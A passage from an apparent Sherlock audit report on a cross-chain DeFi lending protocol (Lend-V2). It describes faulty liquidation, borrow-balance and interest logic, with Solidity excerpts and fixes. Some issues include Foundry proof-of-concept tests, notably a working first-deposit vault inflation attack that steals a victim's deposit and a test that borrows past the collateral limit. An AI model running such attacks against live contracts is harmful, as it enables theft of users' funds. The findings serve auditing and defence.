        address[] memory finalDeployerBorrowedAssets = lendStorageA.getUserBorrowedAssets(deployer);
        assertEq(finalDeployerBorrowedAssets.length, 0, "Deployer should have no borrowed assets");

        // let deployer redeem all his collateral he deposited on chainB
        // after this, there are no collateral on chainB, ONLY in chainA
        coreRouterB.redeem(lendStorageB.totalInvestment(deployer, lTokenB), payable(lTokenB));

        // SECOND SAME-CHAIN BORROW
        // NOTE: User manages to make away with another 3/4 of maxBorrowAmount
        // allowing them to take upto 87.5% when max should be 70%
        coreRouterA.borrow(maxBorrowAmount * 3 / 4, tokenA);

        vm.stopPrank();
    }
```

## Mitigation
Update `removeUserBorrowedAsset()` logic to only remove an asset if the user's total debt (same-chain + cross-chain) for that token is zero.

# Issue H-21: The liquidation validation logic is wrong 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/930 

## Found by 
0xgee, 4n0nx, Aenovir, Falendar, HeckerTrieuTien, Kvar, Rorschach, Waydou, Ziusz, durov, dystopia, ggg\_ttt\_hhh, harry, hgrano, jokr, m3dython, newspacexyz, oxelmiguel, patitonar, rudhra1749, t.aksoy, xiaoming90, zraxx

### Summary

On Chain A (the collateral chain), the [liquidation check](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CrossChainRouter.sol#L431-L436) treats `payload.amount` as if it were an additional borrow amount, but `payload.amount` is the number of collateral tokens to seize.

### Root Cause

On Chain B, during a cross‐chain liquidation, `_executeLiquidationCore` calculates how many collateral tokens to seize:

```solidity
(uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
    .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);
```

Then sends `seizeTokens` (`payload.amount`) to Chain A:

```solidity
_send(
    params.srcEid,
    seizeTokens, // this becomes payload.amount
    params.storedBorrowIndex,
    0,
    params.borrower,
    lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid),
    msg.sender,
    params.borrowedAsset,
    ContractType.CrossChainLiquidationExecute
);
```

The `payload.amount` represents the seize amount (collateral to take), not the borrow amount. But it is being passed as the `borrowAmount` parameter on Chain A:

```solidity
function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
    (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
>       payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
    );
    return borrowed > collateral;
}
```

```solidity
function getHypotheticalAccountLiquidityCollateral(
    address account,
    LToken lTokenModify,
    uint256 redeemTokens,
    uint256 borrowAmount
)
```

In other words, it asks “If this user were to borrow `payload.amount` more, would they be undercollateralized?” But `payload.amount` is not a proposed additional borrow, it is the number of tokens that will be seized. That means a healthy position could be marked liquidatable just because “borrowing that many more” would tip them over the edge, even if no actual borrow ever happens.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

N/A

### Impact

Healthy positions can be mistakenly flagged as liquidatable, allowing valid accounts to be liquidated.

### PoC

_No response_

### Mitigation

Fix `_checkLiquidationValid` to use the correct parameters:

```diff
    function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
        (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
-           payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
+           payload.sender, LToken(payable(payload.destlToken)), 0, 0
        );
        return borrowed > collateral;
    }
```

# Issue H-22: Cross-chain collaterals are wrongly calculated in the borrowWithInterest function 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/946 

## Found by 
0x1422, 0xc0ffEE, 0xubermensch, 0xzey, Allen\_George08, Brene, JeRRy0422, Kvar, Lamsya, PNS, TopStar, Waydou, Z3R0, Ziusz, algiz, anchabadze, dimah7, dystopia, freeking, gkrastenov, heavyw8t, ivanalexandur, jokr, m3dython, mahdifa, oxelmiguel, patitonar, rudhra1749, t.aksoy, wickie, x0rc1ph3r, xiaoming90, zxriptor

### Summary

The `borrowWithInterest`  function can not correctly calculate the cross-chain collaterals, which affects the entire repayment logic.

### Root Cause

When a user tries to make a cross-chain borrow from source chain A to destination chain B, their `crossChainBorrows` are stored on chain B, and their `crossChainCollaterals `are stored on chain A. The cross-chain collateral is stored during the `_handleValidBorrowRequest` function:

```solidity
   lendStorage.addCrossChainCollateral(
                payload.sender, // user
                destUnderlying,  // underlying
                LendStorage.Borrow({
                   //@audit-issue srcEid != destEid
                    srcEid: srcEid,
                    destEid: currentEid,
                    principle: payload.amount,
                    borrowIndex: currentBorrowIndex,
                    borrowedlToken: payload.destlToken,
                    srcToken: payload.srcToken
                })
            );
```

When the user tries to repay their borrow, the system checks the sum of the cross-chain collaterals on either side. In the `borrowWithInterest` function, while calculating the total collateral, it checks whether:

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L497

```solidity
 if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid)
```

This condition is always false, because `destEid` is always different from `srcEid`. As a result, the amount stored for cross-chain collaterals is never included in the borrow amount calculation, potentially leading to incorrect or failed repayments.

### Internal Pre-conditions

N/A

### External Pre-conditions

User should have cross-chain borrow.

### Attack Path

N/A, just need to be called `repayCrossChainBorrow` function.

### Impact

An incorrect calculation of the borrowed amount will be made as the cross-chain collateral is not included. This can potentially lead to incorrect or failed repayments.

### PoC

_No response_

### Mitigation

Avoid checking if `collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid` is true. This condition should be rewritten.

# Issue H-23: Cross chain repayment updates wrong borrow balance 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/964 

## Found by 
0xEkko, 0xc0ffEE, 0xgee, Kvar, SarveshLimaye, Z3R0, benjamin\_0923, dmdg321, ggg\_ttt\_hhh, h2134, jokr, mussucal, newspacexyz, oxelmiguel, patitonar, rudhra1749, sil3th, wickie, xiaoming90

### Summary

The function `CoreRouter::repayBorrowInternal()` only updates user's `borrowBalance` (which is the borrow balance same-chain). This can cause cross chain repayment to update wrong borrow balance

### Root Cause

The function [`_repayCrossChainBorrowInternal()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L368) is used within the flow of function [`repayCrossChainBorrow()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L161) and [`_handleLiquidationSuccess()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L464). The function `_repayCrossChainBorrowInternal()` calls internal function `_handleRepayment()`, which will external call to `CoreRouter::repayCrossChainLiquidation()`. The function `CoreRouter::repayCrossChainLiquidation()` calls internal function `repayBorrowInternal()`. Here exists problem that the cross chain borrow information is not updated, but the same-chain borrow balance.
Indeed, on the dest chain, the borrow information `crossChainCollateral` should be updated.
```solidity
    function repayBorrowInternal(
        address borrower,
        address liquidator,
        uint256 _amount,
        address _lToken,
        bool _isSameChain
    ) internal {
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        LTokenInterface(_lToken).accrueInterest();

        uint256 borrowedAmount;

        if (_isSameChain) {
            borrowedAmount = lendStorage.borrowWithInterestSame(borrower, _lToken);
        } else {
            borrowedAmount = lendStorage.borrowWithInterest(borrower, _lToken);
        }

        require(borrowedAmount > 0, "Borrowed amount is 0");

        uint256 repayAmountFinal = _amount == type(uint256).max ? borrowedAmount : _amount;

        // Transfer tokens from the liquidator to the contract
        IERC20(_token).safeTransferFrom(liquidator, address(this), repayAmountFinal);

        _approveToken(_token, _lToken, repayAmountFinal);

        lendStorage.distributeBorrowerLend(_lToken, borrower);

        // Repay borrowed tokens
        require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");

        // Update same-chain borrow balances
        if (repayAmountFinal == borrowedAmount) {
@>            lendStorage.removeBorrowBalance(borrower, _lToken);
@>            lendStorage.removeUserBorrowedAsset(borrower, _lToken);
        } else {
@>            lendStorage.updateBorrowBalance(
                borrower, _lToken, borrowedAmount - repayAmountFinal, LTokenInterface(_lToken).borrowIndex()
            );
        }

        // Emit RepaySuccess event
        emit RepaySuccess(borrower, _lToken, repayAmountFinal);
    }
```

### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

NA

### Impact

- Potential unable to repay cross chain borrow and liquidate cross chain borrow
- If the function `repayBorrowInternal()` successfully executed, then the same chain borrow balance is also updated, which is incorrectly accounting

### PoC

_No response_

### Mitigation

Since the function `_updateRepaymentState()` is executed later to update cross chain borrow information, then the function `repayBorrowInternal()` should consider not update borrow balance when `_isSameChain == false`

# Issue H-24: Incorrect `destEid` Value in `_handleLiquidationSuccess` Prevents Liquidation Completion 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/979 

## Found by 
0xc0ffEE, Fade, Kirkeelee, Tychai0s, Waydou, Z3R0, aman, h2134, jokr, mahdifa, moray5554, newspacexyz, onthehunt, rudhra1749, xiaoming90

## Summary:

The [_handleLiquidationSuccess](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CrossChainRouter.sol#L443) function in `CrossChainRouter.sol` attempts to locate a cross-chain collateral record using the `findCrossChainCollateral` function in `LendStorage.sol`. However, it incorrectly sets the `destEid` parameter to 0, causing the lookup to always fail. This prevents the liquidation process from completing successfully, leading to debt accumulation and potential losses for the protocol.

## Root Cause:

The `_handleLiquidationSuccess` function, which is called on Chain A after a cross-chain liquidation is executed, uses `lendStorage.findCrossChainCollateral` to find the relevant collateral record. The `destEid` parameter passed to this function is hardcoded to `0`.

```solidity
// filepath: src/LayerZero/CrossChainRouter.sol
(bool found, uint256 index) = lendStorage.findCrossChainCollateral(
    payload.sender,
    underlying,
    srcEid,
    0, // Incorrect destEid
    payload.destlToken,
    payload.srcToken
);
```

## Internal Pre-conditions:

*   The `crossChainCollaterals` mapping contains at least one record for the given user and underlying asset.
*   The function is called with specific values for `srcEid`, `destEid`, `borrowedlToken`, and `srcToken`.

## External Pre-conditions:

*   None.

## Attack Path:

1.  A user initiates a cross-chain borrow, which results in a `Borrow` struct being stored in the `crossChainCollaterals` mapping.
2.  Later, the protocol needs to retrieve this `Borrow` struct using the `findCrossChainCollateral` function.
3.  The function is called with specific values for `srcEid`, `destEid`, `borrowedlToken`, and `srcToken`.
4.  If any of these values do not exactly match the corresponding values stored in the `Borrow` struct, the function will return `false` and `0`, even if a matching record exists.
5.  This can lead to incorrect behavior in the protocol, such as failing to liquidate a user's position or allowing a user to withdraw more collateral than they are entitled to.

## Impact:

*   The protocol may fail to locate valid collateral records, leading to incorrect behavior.
*   Users may be able to exploit this issue to withdraw more collateral than they are entitled to.
*   The protocol's solvency may be threatened due to the potential for uncollateralized positions.



# Issue H-25: Cross chain debt accrues incorrectly 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1009 

## Found by 
0xB4nkz, 0xc0ffEE, 4n0nx, future, jokr, newspacexyz, t.aksoy

### Summary

Using the borrow index of LToken on the same chain for cross chain borrow can cause the cross chain borrow to be incorrectly accrued interest

### Root Cause

The function [`LendStorage::borrowWithInterest()` ](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L478-L503) is used to calculate cross borrow with interest. However, the parameters `_lToken` actually the LToken on the same chain. The function is accruing cross chain borrow interest **with same-chain LToken borrow index**. This can cause debt calculation of cross chain borrows to be imprecise, hence impacting cross chain functionality.
```solidity
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
@>                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
@>                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
```

### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

NA

### Impact

- Cross chain borrow accrues interest incorrectly
- Cross chain functionalities does not work properly 

### PoC

_No response_

### Mitigation

Consider changing the mechanism to accrue cross chain borrow index

# Issue H-26: Incorrect Collateral Check Logic in CoreRouter.sol#borrow() 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1010 

## Found by 
0x15, 0xbakeng, Constant, Frontrunner, Hueber, Uddercover, algiz, aman, dreamcoder, durov, dystopia, ggg\_ttt\_hhh, gkrastenov, h2134, ivanalexandur, jo13, lazyrams352, mahdifa, newspacexyz, patitonar, pv, rudhra1749, safdie, t.aksoy, wickie

### Summary


The borrow() function in CoreRouter.sol implements an incorrect logic for checking a user's collateralization status before allowing a borrow. Instead of directly using the hypothetical account liquidity values calculated by lendStorage.getHypotheticalAccountLiquidityCollateral, it recalculates a borrowAmount using the user's historical borrow index for the specific market. This recalculation is flawed and, in certain scenarios (specifically when a user has no prior borrow balance in the target market), can lead to the collateral check being bypassed entirely. This allows users to borrow assets even if their total debt exceeds their total collateral, potentially creating undercollateralized positions and bad debt for the protocol.

### Vulnerability Details
The function correctly calls lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount) to determine the user's hypothetical total USD debt (borrowed) and total USD collateral (collateral) after the requested _amount is borrowed. The standard and correct check for solvency would be `require(collateral >= borrowed, "Insufficient collateral")`.

However, the code proceeds with the following logic:

```solidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

        LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

        require(collateral >= borrowAmount, "Insufficient collateral");
```


The borrowAmount is calculated by taking the borrowed value (which is already a USD-denominated total debt value) and attempting to scale it using the current borrowIndex of the _lToken and the user's currentBorrow.borrowIndex. Interest indices are designed to correctly scale token principal amounts to account for accrued interest, not to manipulate aggregated USD values representing total debt across potentially multiple assets. This calculation is conceptually incorrect and leads to an inaccurate assessment of the user's debt relative to their collateral.
Zero Borrow Index Bypass: The conditional logic currentBorrow.borrowIndex != 0 ? ... : 0 means that if the user has no existing borrow balance in the specific _lToken market they are attempting to borrow from, currentBorrow.borrowIndex will be 0. In this case, the borrowAmount is explicitly set to 0. The subsequent check `require(collateral >= borrowAmount, "Insufficient collateral")` becomes `require(collateral >= 0, "Insufficient collateral")`. This check will always pass as collateral is a non-negative value, effectively bypassing the crucial solvency check based on the actual hypothetical debt (borrowed) calculated earlier.





### Root Cause

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L153

The function calculates the correct hypothetical liquidity state but then discards the relevant borrowed value (total hypothetical USD debt) in favor of a miscalculated borrowAmount that can be zeroed out under specific, common conditions (first borrow in a market).

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

N/A

### Impact

The primary impact is the potential for users to take on undercollateralized debt. Due to the "Zero Borrow Index Bypass," a user making their first borrow in a specific market can bypass the collateral check, regardless of their actual collateral ratio as determined by the protocol's liquidity calculation (getHypotheticalAccountLiquidityCollateral). This can lead to:

Undercollateralized Positions: Users can borrow more value than their supplied collateral supports.
Protocol Bad Debt: If the price of the borrowed asset increases or the price of the collateral asset decreases, these undercollateralized positions cannot be fully liquidated, resulting in losses for the protocol and its lenders.
System Instability: Widespread undercollateralized borrowing can destabilize the entire lending pool.
The misapplication of the interest index when currentBorrow.borrowIndex != 0 also leads to an incorrect collateral check, but the zero index bypass is the most critical path allowing for significant undercollateralization.

### PoC

_No response_

### Mitigation

The collateral check should directly compare the collateral and borrowed values returned by lendStorage.getHypotheticalAccountLiquidityCollateral. The recalculation of borrowAmount using the borrow index is incorrect and should be removed from the collateral check logic.

# Issue H-27: Subsequent Cross‐Chain Borrows don’t Accrue interest on existing principal when borrowing the same Asset 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1011 

## Found by 
0xc0ffEE, 37H3RN17Y2, Brene, Etherking, HeckerTrieuTien, Kvar, Tigerfrake, Z3R0, algiz, coin2own, dmdg321, francoHacker, future, ggg\_ttt\_hhh, gkrastenov, hgrano, jokr, kom, newspacexyz, oxelmiguel, rudhra1749, t.aksoy, theweb3mechanic, zraxx

### Summary

Borrowing the same asset more than once on Chain B, results in `crossChainBorrow[user][token]` entry's principle not updated with the latest `borrowIndex`, recording less debt on ChainA than the actual saved on Chain B.

This results in incorrect calculation of the account liquidity state via the `getHypotheticalAccountLiquidityCollateral`(..), which can allow the user to borrow more than he should be allowed to. 

### Root Cause

In [CrossChainRouter._handleValidBorrowRequest](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L708-L715), if the user previously borrowed the same asset on ChainB, we need to update the existing `userBorrows[index].principle` on ChainA with the new borrow amount.

To do that, it is correct to **first** update the `userBorrows[index].principle` according to the latest `borrowIndex`, before adding the new borrow amount. (the [way](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L631-L632) it is done on ChainB).

However, the code currently just adds the new borrow amount and updates the state:

```solidity
            userBorrows[index].principle =
                userBorrows[index].principle +
                payload.amount; //@audit - not accounting for interest?
```

The interest accumulated between the previous cross chain borrow and the new one is lost and the user will not have to pay it.

### Internal Pre-conditions

1. User on ChainA has already initiated a cross-chain borrow on ChainB.
2. User triggers a second cross-chain borrow on the same asset.

### External Pre-conditions

None

### Attack Path

1. User initiates cross-chain borrow from Chain A to Chain B.
2. User waits for enough time to pass
3. User performs a second cross-chain borrow from Chain A to Chain B **on the same asset.**
4. User's debt calculated on ChainA is less than the real one(recorded on ChainB) by a factor of the `borrowIndex` accumulated between first borrow and second borrow.
5. User can proceed to borrow more than his collateral is worth(due to the wrong total debt calculated by `getHypotheticalAccountLiquidityCollateral` on Chain A

### Impact

The user can perform subsequent cross chain borrows between the same chains(ChainA and ChainB) on the same asset with enough time between them.
This will cause his outstanding debt saved on ChainA to be less than it should be(by a factor of the `borrowIndex` accumulated between first borrow and second borrow).
This will allow the user to borrow additional funds, that he should not be able to and potentially driving the market to an illiquid state.

### PoC

Can be provided upon request.

### Mitigation

Inside the CrossChainRouter._handleValidBorrowRequest, modify the update on existing principle, so that it accounts for the `borrowIndex` accumulated:

```diff
 if (found) {
            // Update existing borrow
            LendStorage.Borrow[] memory userBorrows = lendStorage.getCrossChainBorrows(payload.sender, payload.srcToken);
-            userBorrows[index].principle = userBorrows[index].principle + payload.amount;
+           userBorrows[index].principle = (userBorrows[index].principle * currentBorrowIndex) / userBorrows[index].borrowIndex + payload.amount
            userBorrows[index].borrowIndex = payload.borrowIndex;

            // Update in storage
            lendStorage.updateCrossChainBorrow(payload.sender, payload.srcToken, index, userBorrows[index]);
        } 

```

# Issue H-28: User funds can be stolen by a vault inflation attack 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1013 

## Found by 
Constant, KiroBrejka, Smacaud, dimah7, momentum, velev

### Summary

An attacker can frontrun the first call to `CoreRouter::supply()` by supplying a small amount first and then artificially inflating the underlying token balance of the `LToken` contract with a direct `transfer()`. As a result, the first supply by a legitimate user will mint 0 LTokens thus giving the ownership over the whole share of the pool to the attacker.

### Root Cause

The calculation for [`mintTokens`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L80) in `CoreRouter` will round down to 0 if the inflation attack is done correctly, as the exchange rate will become larger than the amount of underlying tokens in. Consequently the legitimate user's `totalInvestment` in `LendStorage` will be set to 0.

### Internal Pre-conditions

1. Protocol contracts need to be deployed.
2. Attacker must observe first supply transaction being submitted.

### External Pre-conditions

N/A

### Attack Path

1. A user submits the first supply for a particular LToken.
2. An attacker frontruns the user's transaction.
3. The attacker supplies a small amount of the underlying token to `CoreRouter`.
4. The attacker directly transfers underlying tokens to the `LToken` contract.
5. The user's `supply()` transaction is executed, resulting in 0 LTokens minted.
6. Attacker calls `redeem()` and receives both his initially invested underlying tokens and the first user's assets.

### Impact

An attacker can steal the first supplier's deposit. If he manages to redeem it before another user has deposited into the pool, he can perform the attack multiple times.

### PoC

Paste the following code in `test/TestSupplying.t.sol`.
Use `forge test --match-test test_that_first_deposit_attack_is_feasible -vvv` to run the test.

```solidity
    function test_that_first_deposit_attack_is_feasible() public {
        address attacker = makeAddr("attacker");
        address legitimateUser = makeAddr("legitimateUser");

        address token = supportedTokens[0];
        address lToken = lendStorage.underlyingTolToken(token);

        uint256 attackerUnderlyingTokenBalanceBefore = 2_000_000e18;
        uint256 legitimateUserUnderlyingTokenBalanceBefore = 1_000_000e18;
        //mint underlying tokens to the attacker
        ERC20Mock(token).mint(attacker, attackerUnderlyingTokenBalanceBefore);
        //mint underlying tokens to the legitimate user
        ERC20Mock(token).mint(legitimateUser, legitimateUserUnderlyingTokenBalanceBefore);

        console2.log("Before attack:");
        console2.log("attacker's underlying token balance:", attackerUnderlyingTokenBalanceBefore);
        console2.log("legitimate user's underlying token balance:", legitimateUserUnderlyingTokenBalanceBefore);
        
        //attacker observes user trying to make the first deposit, and frontruns the user's deposit transaction

        //attacker mints LToken by calling supply
        _supply(attacker, "attacker", token, 2 * 1e8);

        //attacker inflates the underlying token balance of CoreRouter by transferring his LTokens
        vm.prank(attacker);
        ERC20Mock(token).transfer(lToken, 1_000_000e18);

        //legitimate user performs supply through the CoreRouter
        _supply(legitimateUser, "legitimateUser", token, legitimateUserUnderlyingTokenBalanceBefore);

        uint256 legitimateUserTotalInvestment = lendStorage.totalInvestment(legitimateUser, lToken);
        console2.log("legitimateUser's total investment:", legitimateUserTotalInvestment);

        //attacker redeems his share
        _redeem(attacker, "attacker", payable(lToken), 1);

        uint256 attackerUnderlyingTokenBalanceAfter = IERC20(token).balanceOf(attacker);
        
        console2.log("After attack:");
        console2.log("attacker's underlying token balance:", attackerUnderlyingTokenBalanceAfter);

        assert(attackerUnderlyingTokenBalanceAfter >= attackerUnderlyingTokenBalanceBefore + legitimateUserUnderlyingTokenBalanceBefore);
    }

    function _supply(address supplier, string memory _alias, address underlying, uint256 amount) internal {
        vm.startPrank(supplier);

        console2.log("%s supplying %d", _alias, amount);

        //mint underlying token
        ERC20Mock(underlying).mint(supplier, amount);
        
        //approve router and supply
        IERC20(underlying).approve(address(coreRouter), amount);
        coreRouter.supply(amount, underlying);

        vm.stopPrank();
    }

     function _redeem(address redeemer, string memory _alias, address payable lToken, uint256 amount) internal {
        vm.startPrank(redeemer);

        console2.log("%s redeeming %d LTokens", _alias, amount);
        
        coreRouter.redeem(amount, lToken);

        vm.stopPrank();
    }
```

### Mitigation

_No response_

# Issue H-29: Incorrect calculation of borrowed amount in liquidateBorrowAllowedInternal 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1019 

## Found by 
0x23r0, 0xAlix2, 0xEkko, 0xc0ffEE, 0xgee, Brene, DharkArtz, Drynooo, Etherking, FalseGenius, HeckerTrieuTien, Hueber, Kirkeelee, Kvar, PNS, Rorschach, Ruppin, SafetyBytes, Sir\_Shades, Smacaud, Sparrow\_Jac, Tigerfrake, Uddercover, Z3R0, anchabadze, coin2own, crazzyivan, future, ggg\_ttt\_hhh, gkrastenov, good0000vegetable, h2134, jokr, khaye26, kom, newspacexyz, oxelmiguel, patitonar, theboiledcorn, theweb3mechanic, udo, wickie, ydlee, zraxx

### Summary

Double interest applied in borrowed amount calculation causes inflated borrow values and incorrect liquidation checks.

### Root Cause

An insufficient shortfall is checked when `borrowedAmount > collateral`. The  `borrowedAmount` is calculated inside the `liquidateBorrowAllowedInternal `function as follows:

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L348
```solidity
 borrowedAmount =
                (borrowed * uint256(LTokenInterface(lTokenBorrowed).borrowIndex())) / borrowBalance.borrowIndex;
```

The borrowed value passed into this function comes from `liquidateBorrow`, where it is calculated using `getHypotheticalAccountLiquidityCollateral`:

```solidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(borrower, LToken(payable(borrowedlToken)), 0, 0);

        liquidateBorrowInternal(
            msg.sender, borrower, repayAmount, lTokenCollateral, payable(borrowedlToken), collateral, borrowed
        );
```

The function` getHypotheticalAccountLiquidityCollateral` already returns the borrowed amount with accrued interest included, since it internally uses the `borrowWithInterestSame` and `borrowWithInterest` methods.

As a result, when the protocol calculates shortfall, it applies interest a second time by again multiplying the already interest-included borrowed amount by the current borrow index and dividing by the stored index.

This causes the `borrowedAmount` used for shortfall checks to be inflated beyond the actual debt.
### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

N/A

### Impact

Users may be incorrectly flagged for liquidation due to an artificially high perceived borrow amount.

### PoC

_No response_

### Mitigation

Avoid double-applying interest. If the borrowed amount already includes accrued interest, it should not be adjusted again using the borrow index.

# Issue M-1: CrossChainBorrow does not enter markets in the lendtroller when borrow cross chain 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/452 

## Found by 
h2134

### Summary

CrossChainBorrow does not enter markets in the lendtroller when borrow cross chain.

### Root Cause

When initiates a cross-chain borrow, protocol tries to enter market in the lendtroller if the borrowed asset is not tracked on the source chain.

[CrossChainRouter.sol#L132-L134](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L132-L134):
```solidity
@>      if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }
```

[CrossChainRouter.sol#L687-L696](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L687-L696):
```solidity
    function isMarketEntered(address user, address asset) internal view returns (bool) {
        address[] memory suppliedAssets = lendStorage.getUserSuppliedAssets(user);
        for (uint256 i = 0; i < suppliedAssets.length;) {
@>          if (suppliedAssets[i] == asset) return true;
            unchecked {
                ++i;
            }
        }
        return false;
    }
```

The problem is that the borrowed asset has already been tracked just before the check, leading to CrossChainBorrow never enters the market in the lendtroller.

[CrossChainRouter.sol#L129-L134](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L129-L134):
```solidity
        // Add collateral tracking on source chain
@>      lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }
``` 

### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

NA

### Impact

CrossChainBorrow does not enter markets in the lendtroller when borrow cross chain.

### PoC

Please run `forge test --mt testPOC_NotEnterMarkets`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

import {ILayerZeroEndpointV2} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";

import {Lend} from "../src/Governance/Lend.sol";
import {Lendtroller, LendtrollerInterface} from "../src/Lendtroller.sol";
import {LErc20Immutable, LToken} from "../src/LErc20Immutable.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {WhitePaperInterestRateModel, InterestRateModel} from "../src/WhitePaperInterestRateModel.sol";

import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {CrossChainRouter, Origin} from "../src/LayerZero/CrossChainRouter.sol";

contract POC is Test {
    using SafeERC20 for IERC20;

    uint32 constant chainAEid = 30101; // Ethereum
    uint32 constant chainBEid = 30184; // Base

    address owner;
    address mockDestLToken;
    address mockPeer;

    IERC20 btc;
    IERC20 dai;
    IERC20 weth;

    LErc20Immutable lTokenBTC;
    LErc20Immutable lTokenDAI;
    LErc20Immutable lTokenWETH;

    Lend lend;

    ILayerZeroEndpointV2 endpoint;

    Lendtroller lendtroller;
    SimplePriceOracle priceOracle;
    WhitePaperInterestRateModel interestRateModel;

    LendStorage lendStorage;
    CoreRouter coreRouter;
    CrossChainRouter crossChainRouter;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org");

        owner = makeAddr("Owner");
        mockDestLToken = makeAddr("MockDestLToken");
        mockPeer = makeAddr("ChainBPeer");
        endpoint = ILayerZeroEndpointV2(
            0x1a44076050125825900e736c501f859c50fE728c
        );

        btc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
